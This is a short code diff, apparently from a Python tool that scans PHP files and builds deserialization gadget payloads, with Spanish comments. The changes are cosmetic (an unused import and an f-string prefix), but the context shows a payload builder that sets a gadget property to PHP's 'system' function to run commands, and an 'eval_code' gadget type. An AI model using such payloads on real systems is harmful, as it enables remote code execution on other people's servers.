@@ -32,7 +32,7 @@ from __future__ import annotations
 
 import os
 import re
-from dataclasses import dataclass, field
+from dataclasses import dataclass
 from typing import Optional
 
 _SCAN_EXT = (".php",)
@@ -264,7 +264,7 @@ def build_payload(gadget: DeserializationGadget, *,
         else:
             # si no hay argumento separado, intenta meter el cmd en el callable como
             # "system(cmd)" con una cadena que PHP evalua como function
-            props = [(gadget.func_prop, f"system")]
+            props = [(gadget.func_prop, "system")]
             # Nota: sin arg_prop la ejecucion dependera del contexto; guardamos igualmente
 
     elif gadget.gadget_type == "eval_code":
